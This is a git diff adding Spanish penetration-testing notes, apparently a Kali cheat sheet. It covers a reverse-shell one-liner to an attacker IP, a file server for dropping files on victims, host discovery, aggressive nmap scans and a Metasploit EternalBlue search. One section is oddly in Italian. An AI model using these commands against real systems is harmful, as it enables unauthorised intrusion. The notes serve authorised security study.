@@ -17,3 +17,121 @@ Luego, en la máquina víctima, ejecuto el payload generado en revshells.com:
 
 `sh -i >& /dev/tcp/10.10.10.10/9001 0>&1`
 
+# Servicio de Python para compartir archivos   
+Puede ser útil durante un ataque tener que cargar archivos en la máquina víctima.  
+Para hacerlo, puedo "montar" un servidor web en Kali para compartir archivos.  
+Escribo el comando:  
+
+`sudo python3 -m http.server 80`  
+
+En la máquina víctima podré descargar el archivo con el comando:  
+
+`wget http://IpMacchinaKali/NombreFichero`  
+
+# ARP-SCAN - NETDISCOVER  
+Para descubrir máquinas dentro de mi red, puedo utilizar arpscan.  
+Debo saber el nombre de la interfaz de red y luego escribir el comando:  
+
+`sudo arp-scan -I eth0 --localnet`  
+
+Puedo hacer lo mismo con netdiscover, escribiendo el comando:  
+
+`sudo netdiscover -I eth0 -r 192.168.10.0/24`  
+
+Puedo obtener la misma información con nmap con el comando:  
+
+`sudo nmap -sn 192.168.10.0/24`  
+
+# Escaneos básicos con nmap  
+Ejemplo de comando de escaneo básico con nmap:  
+
+`sudo nmap -p- -sS -sC -sV --open --min-rate 5000 -n -vvv -Pn 192.168.0.10 -oN 1stScan`  
+
+-p- para escanear todos los puertos  
+-sS para que sea más rápido  
+-sC para ejecutar una serie de scripts básicos  
+-sV para que me muestre la versión del servicio encontrado en el puerto abierto  
+--open para encontrar los puertos abiertos  
+--min-rate con el parámetro 5000 va muy rápido, ideal para la red local de casa, pero en el caso de un examen o en la vida real es mejor usar 1500 o 2000  
+-n para evitar la resolución DNS  
+-vvv para mostrar los resultados durante el escaneo  
+-Pn es decir, sin ping  
+-oN nombrearchivo para exportar en formato nmap  
+
+# Escaneos de vulnerabilidades con nmap  
+Supponiamo di aver scansionato una macchina Windows 7 con la porta 445 aperta.  
+Potremmo usare una utility di nmap per vedere se è vulnerabile.  
+C'è da dire che questo script fa "molto rumore" e non è consigliabile usarlo nel mondo reale.  
+
+`sudo nmap --script "vuln" -p445 192.168.10.10`  
+
+# Escaneo de puertos UDP  
+Es conveniente también realizar escaneos del protocolo UDP.  
+Para hacerlo, por ejemplo, podemos usar el comando:  
+
+`sudo nmap -sU --top-ports 200 --min-rate=5000 -Pn 192.168.10.10`  
+
+# EXPLOTACIÓN DE VULNERABILIDADES Y ATAQUES DE FUERZA BRUTA  
+# Uso básico de Metasploit – Explotación de EternalBlue en Windows  
+Siempre conviene abrir Metasploit desde el menú de Kali, ya que así se ejecuta el siguiente comando que permite actualizar automáticamente la base de datos de Metasploit.  
+
+`sudo msfdb init && msfconsole`  
+
+Si quiero buscar un exploit, puedo hacerlo escribiendo, por ejemplo:  
+
+`search eternalblue`  
+
+O también puedo buscarlo con el nombre de la CVE correspondiente, por ejemplo:  
+
+`search CVE-2017-0143`  
+
+Para usar un módulo, simplemente debo escribir el comando use seguido del número correspondiente del exploit que quiero utilizar, por ejemplo, 0.  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
